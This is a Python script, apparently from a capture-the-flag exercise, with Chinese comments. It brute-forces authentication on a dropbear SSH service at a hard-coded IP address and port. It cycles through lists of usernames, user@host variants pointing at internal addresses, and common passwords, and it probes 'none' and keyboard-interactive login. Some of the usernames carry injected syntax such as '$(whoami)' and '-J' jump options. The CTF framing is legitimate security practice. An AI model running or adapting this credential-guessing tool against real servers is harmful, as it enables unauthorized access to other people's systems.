#!/usr/bin/env python3
"""
重要发现回顾：
1. ctf@localhost 的 host key 仍然是 dropbear 的
2. 这意味着 dropbear 并没有真正代理到另一个 SSH 服务器
3. dropbear 只是在内部处理 user@host 格式

新假设：
--------
dropbear 可能有一个内置的用户表，格式如：
- ctf 用户 -> 密码 123456 -> 容器shell
- ctf@realhost 用户 -> 某个密码 -> 真实主机shell

让我们扫描更多的 user@host 组合！
"""

import paramiko
import time
import itertools

TARGET_HOST = "61.147.171.105"
TARGET_PORT = 55300

def test_auth(username, password):
    """快速测试认证"""
    try:
        transport = paramiko.Transport((TARGET_HOST, TARGET_PORT))
        transport.connect()
        transport.auth_password(username, password)
        transport.close()
        return "success"
    except paramiko.AuthenticationException:
        return "auth_failed"
    except Exception as e:
        if "banner" in str(e).lower() or "eof" in str(e).lower():
            return "connection_closed"
        return f"error:{type(e).__name__}"
    finally:
        try:
            transport.close()
        except:
            pass

print("=" * 70)
print("[*] 扫描可能的 user@host 组合")
print("=" * 70)

# 可能的用户名
users = ["ctf", "root", "admin", "user", "flag", "ubuntu", "guest", "test"]

# 可能的主机名
hosts = [
    "localhost", "127.0.0.1",
    "172.17.0.1", "172.17.0.2",
    "10.42.0.1", "10.42.111.62",
    "10.30.49.12", "10.30.49.14",
    "host", "realhost", "target", "flag"
]

# 可能的密码
passwords = ["123456", "password", "root", "admin", "flag", "ctf", "test", "", "ubuntu"]

print("\n[*] 测试不同的 user@host 组合（使用密码 123456）")
print("-" * 70)

found_interesting = []

for user in users:
    for host in hosts:
        username = f"{user}@{host}"
        result = test_auth(username, "123456")
        if result == "success":
            print(f"[+] {username} => 成功!")
            found_interesting.append((username, "123456"))
        elif result == "auth_failed":
            # 认证失败意味着用户名被接受但密码错误
            print(f"[?] {username} => 认证失败（可能是有效用户）")
            found_interesting.append((username, None))
        elif result == "connection_closed":
            pass  # 跳过，这是预期的行为
        else:
            print(f"[!] {username} => {result}")
        time.sleep(0.1)

print("\n" + "=" * 70)
print("[*] 对有效用户名测试不同密码")
print("=" * 70)

for username, known_pass in found_interesting:
    if known_pass:
        continue  # 已经知道密码了
    
    print(f"\n[*] 测试 {username} 的密码...")
    for password in passwords:
        result = test_auth(username, password)
        if result == "success":
            print(f"  [+] 密码: {password}")
            break
        elif result == "auth_failed":
            pass
        else:
            print(f"  [!] {password} => {result}")
        time.sleep(0.1)

print("\n" + "=" * 70)
print("[*] 测试特殊格式的用户名")
print("=" * 70)

# 测试一些特殊格式
special_usernames = [
    # user:host 格式
    "ctf:localhost",
    "ctf:172.17.0.1",
    
    # user%host 格式
    "ctf%localhost",
    "ctf%172.17.0.1",
    
    # user#host 格式
    "ctf#localhost",
    
    # user!host 格式  
    "ctf!localhost",
    
    # 端口指定
    "ctf@localhost:22",
    "ctf@172.17.0.1:22",
    
    # ProxyJump 风格
    "ctf%ctf@172.17.0.1",
    "ctf+ctf@172.17.0.1",
    
    # 多层跳转
    "ctf@ctf@localhost",
    "ctf@ctf@172.17.0.1",
    
    # 环境变量风格
    "${USER}@localhost",
    "$(whoami)@localhost",
    
    # 特殊主机
    "ctf@docker",
    "ctf@container", 
    "ctf@nspawn",
    "ctf@machine",
    "ctf@host0",
    "ctf@node",
    
    # 内部IP
    "ctf@169.254.169.250",  # DNS服务器
    "ctf@10.42.111.1",      # 可能的网关
    "ctf@10.42.0.0",
    
    # 尝试IPv6
    "ctf@::1",
    "ctf@[::1]",
]

for username in special_usernames:
    result = test_auth(username, "123456")
    if result == "success":
        print(f"[+] {username:40} => 成功!")
    elif result == "auth_failed":
        print(f"[?] {username:40} => 认证失败（有效用户名）")
    elif result == "connection_closed":
        pass
    else:
        print(f"[!] {username:40} => {result}")
    time.sleep(0.1)

print("\n" + "=" * 70)
print("[*] 深入探索：端口转发格式")
print("=" * 70)

# SSH ProxyJump 格式: user@jumphost,user@target
# SSH -W 格式: 不在用户名中

port_forward_formats = [
    "ctf,ctf@172.17.0.1",
    "ctf@localhost,ctf@172.17.0.1",
    "ctf@172.17.0.1,ctf",
    "-J ctf@172.17.0.1",
    "-Jctf@172.17.0.1",
    "ctf -J 172.17.0.1",
]

for username in port_forward_formats:
    result = test_auth(username, "123456")
    if result == "success":
        print(f"[+] {username:40} => 成功!")
    elif result == "auth_failed":
        print(f"[?] {username:40} => 认证失败")
    else:
        pass
    time.sleep(0.1)

print("\n" + "=" * 70)  
print("[*] 测试 'none' 认证方式")
print("=" * 70)

def test_none_auth(username):
    """测试none认证"""
    try:
        transport = paramiko.Transport((TARGET_HOST, TARGET_PORT))
        transport.connect()
        transport.auth_none(username)
        print(f"[+] {username} => none认证成功!")
        return True
    except paramiko.BadAuthenticationType as e:
        print(f"[-] {username} => none不支持，允许: {e.allowed_types}")
        return False
    except paramiko.AuthenticationException:
        print(f"[-] {username} => none认证失败")
        return False
    except Exception as e:
        if "banner" in str(e).lower():
            pass
        else:
            print(f"[!] {username} => {e}")
        return False
    finally:
        try:
            transport.close()
        except:
            pass

# 测试一些用户名的none认证
for username in ["ctf", "root", "ctf@localhost", "ctf@172.17.0.1", "anonymous"]:
    test_none_auth(username)
    time.sleep(0.1)

print("\n" + "=" * 70)
print("[*] 关键测试：keyboard-interactive认证")  
print("=" * 70)

def test_keyboard_interactive(username, responses=["123456"]):
    """测试keyboard-interactive认证"""
    try:
        transport = paramiko.Transport((TARGET_HOST, TARGET_PORT))
        transport.connect()
        
        def handler(title, instructions, prompt_list):
            print(f"    Title: {title}")
            print(f"    Instructions: {instructions}")
            print(f"    Prompts: {prompt_list}")
            return responses[:len(prompt_list)]
        
        transport.auth_interactive(username, handler)
        print(f"[+] {username} => keyboard-interactive成功!")
        return True
    except paramiko.BadAuthenticationType as e:
        print(f"[-] {username} => 不支持，允许: {e.allowed_types}")
        return False
    except paramiko.AuthenticationException:
        print(f"[-] {username} => 认证失败")
        return False
    except Exception as e:
        if "banner" in str(e).lower():
            pass
        else:
            print(f"[!] {username} => {e}")
        return False
    finally:
        try:
            transport.close()
        except:
            pass

for username in ["ctf", "ctf@localhost", "ctf@172.17.0.1"]:
    test_keyboard_interactive(username)
    time.sleep(0.1)

print("\n" + "=" * 70)
print("[*] 总结发现")
print("=" * 70)
print("""
关键观察：
1. ctf@localhost 和 ctf@172.17.0.1 返回 dropbear 的 host key
2. 这意味着 dropbear 内部处理这些用户名
3. 认证失败表示用户名被解析但密码错误

下一步方向：
1. 找到正确的密码组合
2. 探索其他可能的用户名格式
3. 研究 dropbear 的 FakeJumpServer 实现细节
""")
